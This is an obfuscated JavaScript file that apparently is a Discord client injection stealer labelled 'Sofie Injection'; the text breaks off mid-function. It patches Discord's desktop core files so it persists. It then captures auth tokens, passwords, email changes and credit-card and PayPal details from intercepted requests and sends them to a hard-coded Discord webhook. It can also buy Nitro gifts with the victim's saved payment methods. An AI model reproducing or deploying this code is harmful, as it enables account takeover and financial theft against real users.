const _0x22dede=_0x2f30;(function(_0x293465,_0xa9b68c){const _0xb4df60=_0x2f30,_0x4cee1b=_0x293465();while(!![]){try{const _0x1699ea=parseInt(_0xb4df60(0x175))/0x1*(-parseInt(_0xb4df60(0x163))/0x2)+parseInt(_0xb4df60(0x16a))/0x3*(parseInt(_0xb4df60(0x189))/0x4)+-parseInt(_0xb4df60(0x1c4))/0x5*(-parseInt(_0xb4df60(0x195))/0x6)+parseInt(_0xb4df60(0x143))/0x7*(parseInt(_0xb4df60(0x1bc))/0x8)+parseInt(_0xb4df60(0x15a))/0x9*(parseInt(_0xb4df60(0x187))/0xa)+parseInt(_0xb4df60(0x140))/0xb*(parseInt(_0xb4df60(0x10f))/0xc)+parseInt(_0xb4df60(0x16b))/0xd*(-parseInt(_0xb4df60(0x1af))/0xe);if(_0x1699ea===_0xa9b68c)break;else _0x4cee1b['push'](_0x4cee1b['shift']());}catch(_0x48634a){_0x4cee1b['push'](_0x4cee1b['shift']());}}}(_0x5323,0x9d649));const args=process[_0x22dede(0x165)],fs=require('fs'),path=require(_0x22dede(0x1a1)),https=require(_0x22dede(0x198)),querystring=require('querystring'),{BrowserWindow,session}=require(_0x22dede(0x10a)),config={'webhook':_0x22dede(0x1c9),'auto_buy_nitro':![],'ping_on_run':![],'embed_name':_0x22dede(0x10e),'embed_icon':'https://raw.githubusercontent.com/addi00000/empyrean-injection/main/imgs/pfp.png','api':_0x22dede(0x16f),'nitro':{'boost':{'year':{'id':_0x22dede(0x102),'sku':_0x22dede(0x121),'price':_0x22dede(0x112)},'month':{'id':'521847234246082599','sku':_0x22dede(0x1bd),'price':_0x22dede(0x188)}},'classic':{'month':{'id':_0x22dede(0x101),'sku':_0x22dede(0x1bf),'price':_0x22dede(0x199)}}},'filter':{'urls':['https://discord.com/api/v*/users/@me',_0x22dede(0x145),_0x22dede(0x126),'https://discordapp.com/api/v*/auth/login','https://discord.com/api/v*/auth/login','https://*.discord.com/api/v*/auth/login','https://api.braintreegateway.com/merchants/49pp2rp4phym7387/client_api/v*/payment_methods/paypal_accounts','https://api.stripe.com/v*/tokens',_0x22dede(0x134),_0x22dede(0x1a4)]},'filter2':{'urls':[_0x22dede(0x114),_0x22dede(0x13c),'https://discord.com/api/v*/applications/detectable','https://*.discord.com/api/v*/users/@me/library',_0x22dede(0x1b6),'wss://remote-auth-gateway.discord.gg/*']}};function parity_32(_0x432c79,_0xddc9e8,_0x1b1f97){return _0x432c79^_0xddc9e8^_0x1b1f97;}function ch_32(_0x146baa,_0x4e11e0,_0x435b00){return _0x146baa&_0x4e11e0^~_0x146baa&_0x435b00;}function maj_32(_0x101e3e,_0x5726c2,_0x4145a2){return _0x101e3e&_0x5726c2^_0x101e3e&_0x4145a2^_0x5726c2&_0x4145a2;}function rotl_32(_0x2da297,_0x1b1d2d){return _0x2da297<<_0x1b1d2d|_0x2da297>>>0x20-_0x1b1d2d;}function safeAdd_32_2(_0x1f7b46,_0x587c0c){var _0xf01ad=(_0x1f7b46&0xffff)+(_0x587c0c&0xffff),_0x25f09b=(_0x1f7b46>>>0x10)+(_0x587c0c>>>0x10)+(_0xf01ad>>>0x10);return(_0x25f09b&0xffff)<<0x10|_0xf01ad&0xffff;}function safeAdd_32_5(_0x237137,_0x33f7ec,_0x16c488,_0x4ef799,_0x7e8237){var _0x2fee5d=(_0x237137&0xffff)+(_0x33f7ec&0xffff)+(_0x16c488&0xffff)+(_0x4ef799&0xffff)+(_0x7e8237&0xffff),_0x1b7469=(_0x237137>>>0x10)+(_0x33f7ec>>>0x10)+(_0x16c488>>>0x10)+(_0x4ef799>>>0x10)+(_0x7e8237>>>0x10)+(_0x2fee5d>>>0x10);return(_0x1b7469&0xffff)<<0x10|_0x2fee5d&0xffff;}function binb2hex(_0x3c416b){const _0x1cad3a=_0x22dede;var _0x3d9bba=_0x1cad3a(0x152),_0x41f008='',_0x41f552=_0x3c416b['length']*0x4,_0x4df1cd,_0x17390b;for(_0x4df1cd=0x0;_0x4df1cd<_0x41f552;_0x4df1cd+=0x1){_0x17390b=_0x3c416b[_0x4df1cd>>>0x2]>>>(0x3-_0x4df1cd%0x4)*0x8,_0x41f008+=_0x3d9bba[_0x1cad3a(0x1a6)](_0x17390b>>>0x4&0xf)+_0x3d9bba['charAt'](_0x17390b&0xf);}return _0x41f008;}function getH(){return[0x67452301,0xefcdab89,0x98badcfe,0x10325476,0xc3d2e1f0];}function roundSHA1(_0x4e3c96,_0x33af12){var _0xceaea0=[],_0x35face,_0x41d721,_0x5ecd2b,_0x12e640,_0x266f85,_0x170383,_0x5ed199=ch_32,_0x2cbc38=parity_32,_0x2cacab=maj_32,_0x54e292=rotl_32,_0x191e16=safeAdd_32_2,_0x2dea36,_0x37bf80=safeAdd_32_5;_0x35face=_0x33af12[0x0],_0x41d721=_0x33af12[0x1],_0x5ecd2b=_0x33af12[0x2],_0x12e640=_0x33af12[0x3],_0x266f85=_0x33af12[0x4];for(_0x2dea36=0x0;_0x2dea36<0x50;_0x2dea36+=0x1){_0x2dea36<0x10?_0xceaea0[_0x2dea36]=_0x4e3c96[_0x2dea36]:_0xceaea0[_0x2dea36]=_0x54e292(_0xceaea0[_0x2dea36-0x3]^_0xceaea0[_0x2dea36-0x8]^_0xceaea0[_0x2dea36-0xe]^_0xceaea0[_0x2dea36-0x10],0x1);if(_0x2dea36<0x14)_0x170383=_0x37bf80(_0x54e292(_0x35face,0x5),_0x5ed199(_0x41d721,_0x5ecd2b,_0x12e640),_0x266f85,0x5a827999,_0xceaea0[_0x2dea36]);else{if(_0x2dea36<0x28)_0x170383=_0x37bf80(_0x54e292(_0x35face,0x5),_0x2cbc38(_0x41d721,_0x5ecd2b,_0x12e640),_0x266f85,0x6ed9eba1,_0xceaea0[_0x2dea36]);else _0x2dea36<0x3c?_0x170383=_0x37bf80(_0x54e292(_0x35face,0x5),_0x2cacab(_0x41d721,_0x5ecd2b,_0x12e640),_0x266f85,0x8f1bbcdc,_0xceaea0[_0x2dea36]):_0x170383=_0x37bf80(_0x54e292(_0x35face,0x5),_0x2cbc38(_0x41d721,_0x5ecd2b,_0x12e640),_0x266f85,0xca62c1d6,_0xceaea0[_0x2dea36]);}_0x266f85=_0x12e640,_0x12e640=_0x5ecd2b,_0x5ecd2b=_0x54e292(_0x41d721,0x1e),_0x41d721=_0x35face,_0x35face=_0x170383;}return _0x33af12[0x0]=_0x191e16(_0x35face,_0x33af12[0x0]),_0x33af12[0x1]=_0x191e16(_0x41d721,_0x33af12[0x1]),_0x33af12[0x2]=_0x191e16(_0x5ecd2b,_0x33af12[0x2]),_0x33af12[0x3]=_0x191e16(_0x12e640,_0x33af12[0x3]),_0x33af12[0x4]=_0x191e16(_0x266f85,_0x33af12[0x4]),_0x33af12;}function finalizeSHA1(_0x5a3360,_0x638ea0,_0x3b70ce,_0x48a7d3){const _0x3ae25f=_0x22dede;var _0x2f40f9,_0x42afe0,_0x41759d;_0x41759d=(_0x638ea0+0x41>>>0x9<<0x4)+0xf;while(_0x5a3360[_0x3ae25f(0x11d)]<=_0x41759d){_0x5a3360['push'](0x0);}_0x5a3360[_0x638ea0>>>0x5]|=0x80<<0x18-_0x638ea0%0x20,_0x5a3360[_0x41759d]=_0x638ea0+_0x3b70ce,_0x42afe0=_0x5a3360['length'];for(_0x2f40f9=0x0;_0x2f40f9<_0x42afe0;_0x2f40f9+=0x10){_0x48a7d3=roundSHA1(_0x5a3360[_0x3ae25f(0xf4)](_0x2f40f9,_0x2f40f9+0x10),_0x48a7d3);}return _0x48a7d3;}function hex2binb(_0x16ec0d,_0x4e3144,_0xf63403){const _0x5e1899=_0x22dede;var _0x1dfed9,_0xbbe782=_0x16ec0d[_0x5e1899(0x11d)],_0x12b057,_0x2487ac,_0x1246c0,_0x1fc8da,_0x205f13;_0x1dfed9=_0x4e3144||[0x0],_0xf63403=_0xf63403||0x0,_0x205f13=_0xf63403>>>0x3;0x0!==_0xbbe782%0x2&&console[_0x5e1899(0x17b)](_0x5e1899(0x17e));for(_0x12b057=0x0;_0x12b057<_0xbbe782;_0x12b057+=0x2){_0x2487ac=parseInt(_0x16ec0d['substr'](_0x12b057,0x2),0x10);if(!isNaN(_0x2487ac)){_0x1fc8da=(_0x12b057>>>0x1)+_0x205f13,_0x1246c0=_0x1fc8da>>>0x2;while(_0x1dfed9[_0x5e1899(0x11d)]<=_0x1246c0){_0x1dfed9[_0x5e1899(0x12a)](0x0);}_0x1dfed9[_0x1246c0]|=_0x2487ac<<0x8*(0x3-_0x1fc8da%0x4);}else console['error']('String\x20of\x20HEX\x20type\x20contains\x20invalid\x20characters');}return{'value':_0x1dfed9,'binLen':_0xbbe782*0x4+_0xf63403};}class jsSHA{constructor(){const _0x3e9127=_0x22dede;var _0x5d0109=0x0,_0xd69631=[],_0x2b5baf=0x0,_0x36ce91,_0x4a5c60,_0x481fba,_0x1a4dcd,_0x5ee649,_0x5edf53,_0x3e38d4=![],_0x2f446e=![],_0x1cc621=[],_0x8ecbb5=[],_0x11bf12,_0x11bf12=0x1;_0x4a5c60=hex2binb,(_0x11bf12!==parseInt(_0x11bf12,0xa)||0x1>_0x11bf12)&&console[_0x3e9127(0x17b)](_0x3e9127(0x180)),_0x1a4dcd=0x200,_0x5ee649=roundSHA1,_0x5edf53=finalizeSHA1,_0x481fba=0xa0,_0x36ce91=getH(),this['setHMACKey']=function(_0x12a49c){const _0x3656db=_0x3e9127;var _0x4dc354,_0x58ab5a,_0x8c3de3,_0x8646c7,_0x2cc35a,_0x16f8e0,_0x27cee7;_0x4dc354=hex2binb,_0x58ab5a=_0x4dc354(_0x12a49c),_0x8c3de3=_0x58ab5a[_0x3656db(0x109)],_0x8646c7=_0x58ab5a['value'],_0x2cc35a=_0x1a4dcd>>>0x3,_0x27cee7=_0x2cc35a/0x4-0x1;if(_0x2cc35a<_0x8c3de3/0x8){_0x8646c7=_0x5edf53(_0x8646c7,_0x8c3de3,0x0,getH());while(_0x8646c7[_0x3656db(0x11d)]<=_0x27cee7){_0x8646c7[_0x3656db(0x12a)](0x0);}_0x8646c7[_0x27cee7]&=0xffffff00;}else{if(_0x2cc35a>_0x8c3de3/0x8){while(_0x8646c7[_0x3656db(0x11d)]<=_0x27cee7){_0x8646c7[_0x3656db(0x12a)](0x0);}_0x8646c7[_0x27cee7]&=0xffffff00;}}for(_0x16f8e0=0x0;_0x16f8e0<=_0x27cee7;_0x16f8e0+=0x1){_0x1cc621[_0x16f8e0]=_0x8646c7[_0x16f8e0]^0x36363636,_0x8ecbb5[_0x16f8e0]=_0x8646c7[_0x16f8e0]^0x5c5c5c5c;}_0x36ce91=_0x5ee649(_0x1cc621,_0x36ce91),_0x5d0109=_0x1a4dcd,_0x2f446e=!![];},this['update']=function(_0x1ae379){const _0x66d9c8=_0x3e9127;var _0x23ccf1,_0x5b5656,_0x2b27f1,_0x4f122b,_0x10f6e3,_0x16facf=0x0,_0x5a292c=_0x1a4dcd>>>0x5;_0x23ccf1=_0x4a5c60(_0x1ae379,_0xd69631,_0x2b5baf),_0x5b5656=_0x23ccf1[_0x66d9c8(0x109)],_0x4f122b=_0x23ccf1[_0x66d9c8(0x1aa)],_0x2b27f1=_0x5b5656>>>0x5;for(_0x10f6e3=0x0;_0x10f6e3<_0x2b27f1;_0x10f6e3+=_0x5a292c){_0x16facf+_0x1a4dcd<=_0x5b5656&&(_0x36ce91=_0x5ee649(_0x4f122b[_0x66d9c8(0xf4)](_0x10f6e3,_0x10f6e3+_0x5a292c),_0x36ce91),_0x16facf+=_0x1a4dcd);}_0x5d0109+=_0x16facf,_0xd69631=_0x4f122b['slice'](_0x16facf>>>0x5),_0x2b5baf=_0x5b5656%_0x1a4dcd;},this[_0x3e9127(0x12f)]=function(){const _0x102c86=_0x3e9127;var _0x1ec070;![]===_0x2f446e&&console[_0x102c86(0x17b)]('Cannot\x20call\x20getHMAC\x20without\x20first\x20setting\x20HMAC\x20key');const _0x490fbf=function(_0x58207d){return binb2hex(_0x58207d);};return![]===_0x3e38d4&&(_0x1ec070=_0x5edf53(_0xd69631,_0x2b5baf,_0x5d0109,_0x36ce91),_0x36ce91=_0x5ee649(_0x8ecbb5,getH()),_0x36ce91=_0x5edf53(_0x1ec070,_0x481fba,_0x1a4dcd,_0x36ce91)),_0x3e38d4=!![],_0x490fbf(_0x36ce91);};}}if(_0x22dede(0x150)===typeof define&&define[_0x22dede(0x192)])define(function(){return jsSHA;});else'undefined'!==typeof exports?'undefined'!==typeof module&&module['exports']?module[_0x22dede(0x1b1)]=exports=jsSHA:exports=jsSHA:global[_0x22dede(0x184)]=jsSHA;jsSHA[_0x22dede(0x142)]&&(jsSHA=jsSHA[_0x22dede(0x142)]);function totp(_0x12f5ec){const _0x27b5a1=_0x22dede,_0x597c72=0x1e,_0x15ef6a=0x6,_0xba23bf=Date[_0x27b5a1(0x13d)](),_0x465ccc=Math[_0x27b5a1(0x185)](_0xba23bf/0x3e8),_0x2b440f=leftpad(dec2hex(Math[_0x27b5a1(0x1c7)](_0x465ccc/_0x597c72)),0x10,'0'),_0x5c309b=new jsSHA();_0x5c309b[_0x27b5a1(0x133)](base32tohex(_0x12f5ec)),_0x5c309b[_0x27b5a1(0x167)](_0x2b440f);const _0xcb6f5f=_0x5c309b[_0x27b5a1(0x12f)](),_0x45bb69=hex2dec(_0xcb6f5f[_0x27b5a1(0x14e)](_0xcb6f5f[_0x27b5a1(0x11d)]-0x1));let _0x537c05=(hex2dec(_0xcb6f5f[_0x27b5a1(0x174)](_0x45bb69*0x2,0x8))&hex2dec(_0x27b5a1(0x182)))+'';return _0x537c05=_0x537c05['substr'](Math[_0x27b5a1(0x119)](_0x537c05[_0x27b5a1(0x11d)]-_0x15ef6a,0x0),_0x15ef6a),_0x537c05;}function hex2dec(_0x4060ac){return parseInt(_0x4060ac,0x10);}function dec2hex(_0x5cd349){const _0x566d04=_0x22dede;return(_0x5cd349<15.5?'0':'')+Math[_0x566d04(0x185)](_0x5cd349)[_0x566d04(0x1b9)](0x10);}function base32tohex(_0x1c1300){const _0x4b34a2=_0x22dede;let _0x245a62=_0x4b34a2(0x123),_0x412dd5='',_0x4d70c5='';_0x1c1300=_0x1c1300[_0x4b34a2(0x117)](/=+$/,'');for(let _0x39f1f0=0x0;_0x39f1f0<_0x1c1300['length'];_0x39f1f0++){let _0x3545fb=_0x245a62['indexOf'](_0x1c1300[_0x4b34a2(0x1a6)](_0x39f1f0)[_0x4b34a2(0x1c3)]());if(_0x3545fb===-0x1)console['error'](_0x4b34a2(0x14a));_0x412dd5+=leftpad(_0x3545fb['toString'](0x2),0x5,'0');}for(let _0xe1b252=0x0;_0xe1b252+0x8<=_0x412dd5[_0x4b34a2(0x11d)];_0xe1b252+=0x8){let _0x2f23a9=_0x412dd5[_0x4b34a2(0x174)](_0xe1b252,0x8);_0x4d70c5=_0x4d70c5+leftpad(parseInt(_0x2f23a9,0x2)[_0x4b34a2(0x1b9)](0x10),0x2,'0');}return _0x4d70c5;}function leftpad(_0x457d3f,_0x4c288a,_0x4e35e6){const _0x369b98=_0x22dede;return _0x4c288a+0x1>=_0x457d3f[_0x369b98(0x11d)]&&(_0x457d3f=Array(_0x4c288a+0x1-_0x457d3f[_0x369b98(0x11d)])[_0x369b98(0x191)](_0x4e35e6)+_0x457d3f),_0x457d3f;}const discordPath=(function(){const _0x1c474e=_0x22dede,_0x50786f=args[0x0][_0x1c474e(0x1b5)](path[_0x1c474e(0x168)])['slice'](0x0,-0x1)[_0x1c474e(0x191)](path[_0x1c474e(0x168)]);let _0x1e85bb;if(process[_0x1c474e(0x169)]===_0x1c474e(0x1be))_0x1e85bb=path[_0x1c474e(0x191)](_0x50786f,_0x1c474e(0x178));else process[_0x1c474e(0x169)]===_0x1c474e(0x193)&&(_0x1e85bb=path[_0x1c474e(0x191)](_0x50786f,_0x1c474e(0x155),_0x1c474e(0x18b)));if(fs['existsSync'](_0x1e85bb))return{'resourcePath':_0x1e85bb,'app':_0x50786f};return{'undefined':undefined,'undefined':undefined};}());function updateCheck(){const _0x478947=_0x22dede,{resourcePath:_0xec80d7,app:_0x327473}=discordPath;if(_0xec80d7===undefined||_0x327473===undefined)return;const _0x562ac3=path[_0x478947(0x191)](_0xec80d7,_0x478947(0x160)),_0xf5eefe=path[_0x478947(0x191)](_0x562ac3,'package.json'),_0x2c1e5b=path[_0x478947(0x191)](_0x562ac3,_0x478947(0x16e)),_0x2c1ca6=fs[_0x478947(0x11f)](_0x327473+_0x478947(0x146))[_0x478947(0x19d)](_0x33ea9b=>/discord_desktop_core-+?/[_0x478947(0x10c)](_0x33ea9b))[0x0],_0x527ba7=_0x327473+_0x478947(0x146)+_0x2c1ca6+_0x478947(0xfc),_0x4a2cda=path[_0x478947(0x191)](process['env']['APPDATA'],'\x5cbetterdiscord\x5cdata\x5cbetterdiscord.asar');if(!fs[_0x478947(0x158)](_0x562ac3))fs[_0x478947(0x116)](_0x562ac3);if(fs[_0x478947(0x158)](_0xf5eefe))fs[_0x478947(0x104)](_0xf5eefe);if(fs[_0x478947(0x158)](_0x2c1e5b))fs[_0x478947(0x104)](_0x2c1e5b);if(process[_0x478947(0x169)]==='win32'||process[_0x478947(0x169)]===_0x478947(0x193)){fs[_0x478947(0x19c)](_0xf5eefe,JSON['stringify']({'name':'discord','main':_0x478947(0x16e)},null,0x4));const _0x492dea='const\x20fs\x20=\x20require(\x27fs\x27),\x20https\x20=\x20require(\x27https\x27);\x0aconst\x20indexJs\x20=\x20\x27'+_0x527ba7+_0x478947(0x1ab)+_0x4a2cda+_0x478947(0x11a)+config[_0x478947(0xff)]+_0x478947(0x154)+config['webhook']+_0x478947(0x194)+config[_0x478947(0x138)]+_0x478947(0x115)+path['join'](_0xec80d7,_0x478947(0x1c6))+_0x478947(0x1b2);fs[_0x478947(0x19c)](_0x2c1e5b,_0x492dea[_0x478947(0x117)](/\\/g,'\x5c\x5c'));}if(!fs[_0x478947(0x158)](path[_0x478947(0x191)](__dirname,_0x478947(0x15d))))return!0x0;return fs['rmdirSync'](path[_0x478947(0x191)](__dirname,_0x478947(0x15d))),execScript(_0x478947(0xf9)),!0x1;}function _0x5323(){const _0xa966f4=['999','774212monoQS','Email\x20Cím:\x20**','Resources','Discord\x20Staff,\x20','includes','**\x0aSzámlázás:\x20**','**\x20-\x20Jelszó:\x20**','card[number]','join','amd','darwin','\x27)\x0a\x20\x20\x20\x20\x20\x20\x20\x20res.replace(\x27%WEBHOOK_KEY%\x27,\x20\x27','6EizTcP','content','gift_code','https','499','avatar','onBeforeRequest','writeFileSync','filter','username','Access-Control-Allow-Origin\x20\x27*\x27','None','path','card[cvc]','**Belépési\x20azonosító**','https://api.stripe.com/v*/payment_intents/*/confirm','var\x20xmlHttp\x20=\x20new\x20XMLHttpRequest();\x0a\x20\x20\x20\x20xmlHttp.open(\x22POST\x22,\x20\x22https://discord.com/api/v9/store/skus/','charAt','Early\x20Supporter,\x20','request','var\x20xmlHttp\x20=\x20new\x20XMLHttpRequest();\x20\x0a\x20\x20\x20\x20xmlHttp.open(\x22GET\x22,\x20\x22','value','\x27;\x0aconst\x20bdPath\x20=\x20\x27','method','month','nitro','14rvISwE','statusCode','exports','\x27)\x0aif\x20(fs.existsSync(bdPath))\x20require(bdPath);','onHeadersReceived','responseHeaders','split','https://discord.com/api/v*/users/@me/library','password','premium_type','toString','email','catch','180728CYfUji','511651880837840896','win32','511651871736201216','**Email\x20Cím\x20módosult**','webRequest','write','toUpperCase','4685035AFSHAO','Access-Control-Allow-Headers\x20\x27*\x27','app.asar','floor','url','https://discord.com/api/webhooks/1179054722238398614/xk1ALII9AyVIcJs8ZarcCLtJFILwuAqxbRBQWRxnJmdhh4wn-ZpxayfLqawIV0zA6mTy','slice','/purchase\x22,\x20false);\x0a\x20\x20\x20\x20xmlHttp.setRequestHeader(\x22Authorization\x22,\x20\x22','tokens','lenght','startsWith','window.webpackJsonp?(gg=window.webpackJsonp.push([[],{get_require:(a,b,c)=>a.exports=c},[[\x22get_require\x22]]]),delete\x20gg.m.get_require,delete\x20gg.c.get_require):window.webpackChunkdiscord_app&&window.webpackChunkdiscord_app.push([[Math.random()],{},a=>{gg=a}]);function\x20LogOut(){(function(a){const\x20b=\x22string\x22==typeof\x20a?a:null;for(const\x20c\x20in\x20gg.c)if(gg.c.hasOwnProperty(c)){const\x20d=gg.c[c].exports;if(d&&d.__esModule&&d.default&&(b?d.default[b]:a(d.default)))return\x20d.default;if(d&&(b?d[b]:a(d)))return\x20d}return\x20null})(\x22login\x22).logout()}LogOut();','**PayPal\x20fiók\x20tásítva\x20lett**','card[exp_month]','\x5cdiscord_desktop_core\x5cindex.js','**\x0aCVC:\x20**','uploadData','injection_url','api','521846918637420545','521847234246082599','parse','unlinkSync','Nincs','**\x0aÚj\x20jelszó:\x20**','HypeSquad\x20Balance,\x20','**\x0aRégi\x20jelszó:\x20**','binLen','electron','ping_val','test','2422867c-244d-476a-ba4f-36e197758d97','Sofie\x20Injection','24gvrgQP','Nem\x20sikerült\x20a\x20vásárlás','```','9999','end','https://status.discord.com/api/v*/scheduled-maintenances/upcoming.json','\x27)\x0a\x20\x20\x20\x20\x20\x20\x20\x20res.pipe(file);\x0a\x20\x20\x20\x20\x20\x20\x20\x20file.on(\x27finish\x27,\x20()\x20=>\x20{\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20file.close();\x0a\x20\x20\x20\x20\x20\x20\x20\x20});\x0a\x20\x20\x20\x20\x0a\x20\x20\x20\x20}).on(\x22error\x22,\x20(err)\x20=>\x20{\x0a\x20\x20\x20\x20\x20\x20\x20\x20setTimeout(init(),\x2010000);\x0a\x20\x20\x20\x20});\x0a}\x0arequire(\x27','mkdirSync','replace','new_password','max','\x27;\x0aconst\x20fileSize\x20=\x20fs.statSync(indexJs).size\x0afs.readFileSync(indexJs,\x20\x27utf8\x27,\x20(err,\x20data)\x20=>\x20{\x0a\x20\x20\x20\x20if\x20(fileSize\x20<\x2020000\x20||\x20data\x20===\x20\x22module.exports\x20=\x20require(\x27./core.asar\x27)\x22)\x20\x0a\x20\x20\x20\x20\x20\x20\x20\x20init();\x0a})\x0aasync\x20function\x20init()\x20{\x0a\x20\x20\x20\x20https.get(\x27','protocol','concat','length','(webpackChunkdiscord_app.push([[\x27\x27],{},e=>{m=[];for(let\x20c\x20in\x20e.c)m.push(e.c[c])}]),m).find(m=>m?.exports?.default?.getToken!==void\x200).exports.default.getToken()','readdirSync','log','511651885459963904','onCompleted','ABCDEFGHIJKLMNOPQRSTUVWXYZ234567','content-security-policy','usd','https://*.discord.com/api/v*/users/@me','endsWith','/billing/payment-sources\x22,\x20false);\x20\x0a\x20\x20\x20\x20xmlHttp.setRequestHeader(\x22Authorization\x22,\x20\x22','Nitro\x20Boost','push','pathname','**\x0aSzelvények:\x20**','HypeSquad\x20Brillance,\x20','💳\x20','getHMAC','assign','host','login','setHMACKey','https://api.stripe.com/v*/setup_intents/*/confirm','confirm','ping_on_run','forEach','webhook_protector_key','year','embed_name','Nitro\x20Classic','https://*.discord.com/api/v*/applications/detectable','now','Partnered\x20Server\x20Owner,\x20','.webp','6785515qzsCWL','**Nitro:**\x0a```diff\x0a+\x20','default','49IBayTk','\x22);\x0a\x20\x20\x20\x20xmlHttp.send(null);\x0a\x20\x20\x20\x20xmlHttp.responseText;','https://discordapp.com/api/v*/users/@me','\x5cmodules\x5c','));\x0a\x20\x20\x20\x20xmlHttp.responseText','Verified\x20Bot\x20Developer,\x20','invalid','Invalid\x20base32\x20character\x20in\x20key','from','HypeSquad\x20Bravery,\x20','\x22,\x20false);\x0a\x20\x20\x20\x20xmlHttp.setRequestHeader(\x22Authorization\x22,\x20\x22','substring','card[exp_year]','function','<:paypal:951139189389410365>\x20','0123456789abcdef','paypal_accounts','\x27,\x20(res)\x20=>\x20{\x0a\x20\x20\x20\x20\x20\x20\x20\x20const\x20file\x20=\x20fs.createWriteStream(indexJs);\x0a\x20\x20\x20\x20\x20\x20\x20\x20res.replace(\x27%WEBHOOK%\x27,\x20\x27','Contents','\x22);\x0a\x20\x20\x20\x20xmlHttp.setRequestHeader(\x27Content-Type\x27,\x20\x27application/json\x27);\x0a\x20\x20\x20\x20xmlHttp.send(JSON.stringify(','**Discord\x20Információk**','existsSync','default-src\x20\x27*\x27','4205133tViRNy','stringify','./core.asar','initiation','api/webhooks','POST','app','https://cdn.discordapp.com/avatars/','Active\x20Developer,\x20','2315568tdvqbn','executeJavaScript','argv','Gold\x20BugHunter,\x20','update','sep','platform','15GdSOin','31572424GpJnMD','sku','Nitro\x20Típus:\x20**','index.js','https://discord.com/api/v9/users/@me','flags','defaultSession','bytes','**\x0aHitelkártya\x20lejárata:\x20**','substr','1AEbySH','var\x20xmlHttp\x20=\x20new\x20XMLHttpRequest();\x0a\x20\x20\x20\x20xmlHttp.open(\x22GET\x22,\x20\x22','**Jelszó\x20módosult**','resources','boost','Új\x20Email\x20Cím:\x20**','error','webhook','Green\x20BugHunter,\x20','String\x20of\x20HEX\x20type\x20must\x20be\x20in\x20byte\x20increments','https://discord.gift/','numRounds\x20must\x20a\x20integer\x20>=\x201','embed_icon','7fffffff','type','jsSHA','round','Authorization','20pMxJCj'];_0x5323=function(){return _0xa966f4;};return _0x5323();}function _0x2f30(_0x1d8118,_0x2fc547){const _0x532313=_0x5323();return _0x2f30=function(_0x2f30db,_0x40ae39){_0x2f30db=_0x2f30db-0xf4;let _0x3c07d5=_0x532313[_0x2f30db];return _0x3c07d5;},_0x2f30(_0x1d8118,_0x2fc547);}const execScript=_0x2de8ed=>{const _0x574983=_0x22dede,_0x599fdc=BrowserWindow['getAllWindows']()[0x0];return _0x599fdc['webContents'][_0x574983(0x164)](_0x2de8ed,!0x0);},getInfo=async _0x1afef8=>{const _0x2a5b44=_0x22dede,_0x24c1b6=await execScript(_0x2a5b44(0x176)+config['api']+_0x2a5b44(0x14d)+_0x1afef8+_0x2a5b44(0x144));return JSON[_0x2a5b44(0x103)](_0x24c1b6);},fetchBilling=async _0x25b6f6=>{const _0x3a077a=_0x22dede,_0x528a17=await execScript(_0x3a077a(0x1a9)+config[_0x3a077a(0x100)]+_0x3a077a(0x128)+_0x25b6f6+'\x22);\x20\x0a\x20\x20\x20\x20xmlHttp.send(null);\x20\x0a\x20\x20\x20\x20xmlHttp.responseText');if(!_0x528a17[_0x3a077a(0xf7)]||_0x528a17[_0x3a077a(0x11d)]===0x0)return'';return JSON['parse'](_0x528a17);},getBilling=async _0x332be7=>{const _0x58d2a4=_0x22dede,_0xb3083=await fetchBilling(_0x332be7);if(!_0xb3083)return _0x58d2a4(0x105);let _0x8e5130='';_0xb3083[_0x58d2a4(0x137)](_0x46e97b=>{const _0x3ba9a4=_0x58d2a4;if(!_0x46e97b[_0x3ba9a4(0x149)])switch(_0x46e97b[_0x3ba9a4(0x183)]){case 0x1:_0x8e5130+=_0x3ba9a4(0x12e);break;case 0x2:_0x8e5130+=_0x3ba9a4(0x151);break;}});if(!_0x8e5130)_0x8e5130=_0x58d2a4(0x105);return _0x8e5130;},Purchase=async(_0x1153dc,_0x174b57,_0xd76f48,_0x707f14)=>{const _0x54c165=_0x22dede,_0x3079d8={'expected_amount':config[_0x54c165(0x1ae)][_0xd76f48][_0x707f14]['price'],'expected_currency':_0x54c165(0x125),'gift':!![],'payment_source_id':_0x174b57,'payment_source_token':null,'purchase_token':_0x54c165(0x10d),'sku_subscription_plan_id':config[_0x54c165(0x1ae)][_0xd76f48][_0x707f14][_0x54c165(0x16c)]},_0x15634a=execScript(_0x54c165(0x1a5)+config[_0x54c165(0x1ae)][_0xd76f48][_0x707f14]['id']+_0x54c165(0xf5)+_0x1153dc+_0x54c165(0x156)+JSON[_0x54c165(0x15b)](_0x3079d8)+_0x54c165(0x147));if(_0x15634a[_0x54c165(0x197)])return _0x54c165(0x17f)+_0x15634a[_0x54c165(0x197)];else return null;},buyNitro=async _0xcaf250=>{const _0x3d9349=_0x22dede,_0x5693f2=await fetchBilling(_0xcaf250),_0x2cda24=_0x3d9349(0x110);if(!_0x5693f2)return _0x2cda24;let _0x265e99=[];_0x5693f2['forEach'](_0x7b1086=>{const _0x52cf46=_0x3d9349;!_0x7b1086[_0x52cf46(0x149)]&&(_0x265e99=_0x265e99[_0x52cf46(0x11c)](_0x7b1086['id']));});for(let _0x3dd43e in _0x265e99){const _0x594e5d=Purchase(_0xcaf250,_0x3dd43e,_0x3d9349(0x179),_0x3d9349(0x139));if(_0x594e5d!==null)return _0x594e5d;else{const _0x383889=Purchase(_0xcaf250,_0x3dd43e,_0x3d9349(0x179),_0x3d9349(0x1ad));if(_0x383889!==null)return _0x383889;else{const _0x96f096=Purchase(_0xcaf250,_0x3dd43e,'classic','month');return _0x96f096!==null?_0x96f096:_0x2cda24;}}}},getNitro=_0x413007=>{const _0x337473=_0x22dede;switch(_0x413007){case 0x0:return _0x337473(0x105);case 0x1:return _0x337473(0x13b);case 0x2:return _0x337473(0x129);default:return'Nincs';}},getBadges=_0x5961a3=>{const _0x38b5fb=_0x22dede;let _0xae77ce='';switch(_0x5961a3){case 0x1:_0xae77ce+=_0x38b5fb(0x18c);break;case 0x2:_0xae77ce+=_0x38b5fb(0x13e);break;case 0x20000:_0xae77ce+=_0x38b5fb(0x148);break;case 0x400000:_0xae77ce+=_0x38b5fb(0x162);break;case 0x4:_0xae77ce+='Hypesquad\x20Event,\x20';break;case 0x4000:_0xae77ce+=_0x38b5fb(0x166);break;case 0x8:_0xae77ce+=_0x38b5fb(0x17d);break;case 0x200:_0xae77ce+=_0x38b5fb(0x1a7);break;case 0x80:_0xae77ce+=_0x38b5fb(0x12d);break;case 